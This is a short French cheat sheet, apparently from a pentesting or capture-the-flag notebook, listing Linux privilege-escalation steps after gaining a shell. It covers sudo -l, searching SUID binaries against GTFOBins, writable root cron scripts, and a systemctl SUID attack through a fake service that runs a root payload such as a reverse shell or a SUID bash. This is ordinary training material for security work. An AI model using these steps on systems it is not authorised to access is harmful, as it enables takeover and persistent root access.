---
title: Privilege escalation — réflexes Linux
category: postexploit
icon: ⬆️
difficulty: Essentiel
tags: [privesc, privilege-escalation, sudo, suid, gtfobins, systemctl, cron]
summary: Les premiers réflexes de privesc Linux dès qu'on pop un shell — sudo -l, SUID/GTFOBins, cron, et exploit systemctl SUID via faux service.
updated: 2026-09-25
source: cheatsheet
---

## Premier réflexe absolu

Sur **tout** shell Linux popé : `sudo -l` direct, sans réfléchir.

```bash
sudo -l
```

- `(ALL) NOPASSWD: ALL` = noël en juillet, privesc trivial.
- Autres pistes à explorer : SUID, cron jobs, capabilities, kernel exploits.

## SUID

```bash
find / -perm -4000 2>/dev/null   # top réflexe sur tout shell Linux
```

- Cross-check chaque binaire suspect sur **GTFOBins** (gtfobins.github.io).
- Légitimes courants : `sudo`, `passwd`, `mount`, `umount`, `su`, `chfn`, `chsh`, `ping`, `pkexec`.
- Cherche les anomalies : `systemctl`, `find`, `vim`, `nano`, `python`, `bash`, `nmap`, `tar`, `cp` en SUID = exploitable.

## Cron

Un cron tournant en root sur un script dont tu as les droits d'écriture = privesc classique.

```bash
cat /etc/crontab
ls -la /etc/cron.*
```

## Exploit systemctl SUID via faux service

```bash
# Créer un .service avec ExecStart= qui contient le payload root
systemctl link /tmp/x.service
systemctl enable --now x.service
```

Le service tourne en root → exécute le payload. Payload utile : nouveau reverse shell sur un autre port, ou `chmod +s` sur bash.

## Multi-listeners / multi-shells

- Workflow privesc = 2 shells côte à côte (un user, un root après escalade).
- Toujours utiliser des **ports différents** pour les listeners (4444 / 4445).
- `whoami` + `hostname` pour vérifier dans quel shell on est (piège classique : confondre AttackBox local et shell distant).
